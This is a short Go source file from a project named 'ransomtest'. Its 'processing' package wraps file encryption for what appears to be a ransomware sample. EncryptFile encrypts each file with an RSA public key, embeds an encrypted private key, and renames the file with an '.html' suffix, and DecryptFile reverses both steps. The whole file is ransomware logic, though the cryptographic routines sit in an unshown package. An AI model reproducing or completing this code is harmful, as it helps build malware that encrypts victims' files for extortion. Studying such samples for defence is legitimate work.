// Processing package offers a higher level of abstraction for file encryption process
package processing

import (
	"crypto/rsa"
	"fmt"
	"os"
	"path/filepath"
	"ransomtest/cryptutils"
	"strings"
)

func DecryptFile(file_path string, privkey *rsa.PrivateKey) {
	if filepath.Ext(file_path) == ".html" && !cryptutils.IsEncryptedFile(file_path) {
		return
	}
	fmt.Println("Decrypting", file_path)
	cryptutils.DecryptFile(file_path, privkey)
	os.Rename(file_path, strings.TrimSuffix(file_path, ".html"))
}

func EncryptFile(file_path string, pubkey *rsa.PublicKey, enc_privkey string) {
	if cryptutils.IsEncryptedFile(file_path) {
		return
	}
	fmt.Println("Encrypting:", file_path)
	cryptutils.EncryptFile(file_path, pubkey, enc_privkey)

	os.Rename(file_path, file_path+".html")
}
